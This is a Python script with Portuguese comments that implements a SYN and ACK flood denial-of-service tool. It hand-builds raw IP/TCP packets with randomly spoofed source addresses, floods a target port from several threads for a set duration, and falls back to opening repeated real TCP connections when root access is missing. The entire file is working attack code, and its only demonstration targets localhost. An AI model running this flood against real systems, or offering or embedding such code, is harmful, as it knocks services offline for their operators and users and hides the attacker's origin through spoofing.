#!/usr/bin/env python3
"""
SYN Flood e ACK Flood usando raw sockets (requer root).
Se raw socket não estiver disponível, faz fallback para socket TCP normal.
"""

import socket
import struct
import random
import time
import threading
import os


def _checksum(data: bytes) -> int:
    """Calcula checksum IP/TCP."""
    if len(data) % 2 != 0:
        data += b'\x00'
    
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
    
    s = (s >> 16) + (s & 0xffff)
    s = (s >> 16) + (s & 0xffff)
    
    return ~s & 0xffff


def _create_syn_packet(src_ip: str, dst_ip: str, dst_port: int, 
                       src_port: int, ack: bool = False) -> bytes:
    """
    Cria um pacote TCP SYN ou ACK manualmente.
    """
    # IP Header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40  # IP (20) + TCP (20)
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        ip_saddr,
        ip_daddr
    )
    
    # TCP Header
    tcp_source = src_port
    tcp_dest = dst_port
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5  # Data offset (4 bits)
    
    # Flags
    if ack:
        tcp_flags = 0x10  # ACK
    else:
        tcp_flags = 0x02  # SYN
    
    tcp_window = socket.htons(65535)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_header = struct.pack('!HHIIBBHHH',
        tcp_source,
        tcp_dest,
        tcp_seq,
        tcp_ack_seq,
        (tcp_doff << 4) + 0,
        tcp_flags,
        tcp_window,
        tcp_check,
        tcp_urg_ptr
    )
    
    # Pseudo header para checksum TCP
    tcp_len = 20  # TCP header length
    psh = struct.pack('!4s4sBBH',
        ip_saddr,
        ip_daddr,
        0,
        socket.IPPROTO_TCP,
        tcp_len
    ) + tcp_header
    
    tcp_check = _checksum(psh)
    
    # Rebuild TCP header with checksum
    tcp_header = struct.pack('!HHIIBBHHH',
        tcp_source,
        tcp_dest,
        tcp_seq,
        tcp_ack_seq,
        (tcp_doff << 4) + 0,
        tcp_flags,
        tcp_window,
        tcp_check,
        tcp_urg_ptr
    )
    
    return ip_header + tcp_header


def syn_attack(target_ip: str, target_port: int = 80, duration: int = 60,
               stop_event: threading.Event = None, ack: bool = False,
               threads: int = 4):
    """
    SYN ou ACK flood usando raw sockets.
    
    Args:
        target_ip: IP do alvo
        target_port: Porta alvo
        duration: Duração em segundos
        stop_event: Evento para parar
        ack: Se True, envia pacotes ACK em vez de SYN
        threads: Número de threads
    """
    
    if stop_event is None:
        stop_event = threading.Event()
    
    flood_type = "ACK" if ack else "SYN"
    
    def flood_worker(worker_id):
        try:
            # Raw socket requer root
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            end_time = time.time() + duration
            
            while time.time() < end_time:
                if stop_event.is_set():
                    break
                
                # IP de origem aleatório (spoofing)
                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                
                packet = _create_syn_packet(
                    src_ip=src_ip,
                    dst_ip=target_ip,
                    dst_port=target_port,
                    src_port=src_port,
                    ack=ack
                )
                
                try:
                    sock.sendto(packet, (target_ip, 0))
                except:
                    pass
            
            sock.close()
        
        except PermissionError:
            print(f"[!] Raw socket requer root. Usando fallback TCP para {flood_type} flood.")
            _syn_fallback(target_ip, target_port, duration, stop_event, ack)
        
        except Exception as e:
            print(f"[!] Worker {worker_id} erro: {e}")
    
    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
        t.start()
        workers.append(t)
    
    for t in workers:
        t.join()


def _syn_fallback(target_ip: str, target_port: int, duration: int,
                  stop_event: threading.Event, ack: bool = False):
    """
    Fallback sem raw socket — abre conexões TCP reais.
    """
    flood_type = "ACK" if ack else "SYN"
    end_time = time.time() + duration
    
    while time.time() < end_time:
        if stop_event.is_set():
            break
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            if ack:
                # No ACK flood, envia dados após conectar
                sock.send(random.randbytes(1024))
            sock.close()
        except:
            pass  # Ignora erros (porta fechada, timeouts, etc)


if __name__ == '__main__':
    print("[*] Testando SYN flood por 5 segundos...")
    stop = threading.Event()
    t = threading.Thread(target=syn_attack, args=('127.0.0.1', 80, 5, stop))
    t.start()
    time.sleep(5)
    stop.set()
    print("[*] Teste finalizado.")
